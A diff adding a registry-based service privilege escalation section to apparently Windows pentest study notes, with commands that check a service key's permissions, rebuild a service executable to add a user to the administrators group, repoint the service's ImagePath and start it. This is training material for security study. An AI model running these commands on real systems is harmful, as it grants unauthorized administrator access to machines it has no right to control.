@@ -121,6 +121,27 @@ Abuse of the research methodology of executable of windows. We will try to place
   - Wait for the administrator to log in
 - You should have a shell in your kali in Metasploit
 
+## Service Escalation - Registry
+
+### What is it
+
+- If we have admin rights of a registry key in service we could use this to make an executable run with a service (add a user, get a shell, ...)
+
+### Enumeration
+
+- In a powershell prompt type `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`  
+![image](https://user-images.githubusercontent.com/96747355/162577548-662dd3db-2722-40c8-ae19-3ae386d32a90.png)  
+
+### How to exploit
+
+- We will use this [C script](https://github.com/sagishahar/scripts/blob/master/windows_service.c)
+- We will modify the whoami command: `system("whoami > c:\\windows\\temp\\service.txt");`  we will add this instead `cmd.exe /k net localgroup administrators user /add` so our script now looks like this: `system("cmd.exe /k net localgroup administrators user /add");`
+- We will compile it `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
+- Let's now get the the exe file in our target (python http server -> browser in our target to dl the file) and put it where we have write rights (in the example it is going to be C:\Temp)
+- In a cmd from our target `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
+- Now we just need to start the service `sc start regsvc`
+- `net localgroup administrators` we can see that our user is now in the administrators group
+
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
